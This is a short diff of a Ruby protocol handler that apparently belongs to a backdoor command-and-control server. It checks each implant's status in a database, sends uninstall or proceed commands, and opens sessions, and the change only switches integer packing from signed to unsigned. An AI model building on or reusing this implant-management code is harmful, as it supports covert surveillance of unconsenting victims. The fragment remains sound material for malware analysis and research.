@@ -110,18 +110,18 @@ class Protocol
     # ask the database the status of the backdoor
     status, bid = DB.instance.status_of(build_id, instance_id, subtype)
 
-    response = [Commands::PROTO_NO].pack('i')
+    response = [Commands::PROTO_NO].pack('I')
     # what to do based on the backdoor status
     case status
       when DB::DELETED_BACKDOOR, DB::NO_SUCH_BACKDOOR, DB::CLOSED_BACKDOOR
-        response = [Commands::PROTO_UNINSTALL].pack('i')
+        response = [Commands::PROTO_UNINSTALL].pack('I')
         trace :info, "[#{peer}] Uninstall command sent"
       when DB::QUEUED_BACKDOOR
-        response = [Commands::PROTO_NO].pack('i')
+        response = [Commands::PROTO_NO].pack('I')
         trace :warn, "[#{peer}] was queued for license limit exceeded"
       when DB::ACTIVE_BACKDOOR, DB::UNKNOWN_BACKDOOR
         # everything is ok or the db is not connected, proceed
-        response = [Commands::PROTO_OK].pack('i')
+        response = [Commands::PROTO_OK].pack('I')
 
         # create a valid cookie session
         cookie = SessionManager.instance.create(bid, build_id, instance_id, subtype, k)
@@ -173,7 +173,7 @@ class Protocol
     command = message.slice!(0..3)
 
     # retrieve the type of the command
-    command = command.unpack('i').first.to_i
+    command = command.unpack('I').first.to_i
 
     # invoke the right method for parsing
     if not Commands::LOOKUP[command].nil? then
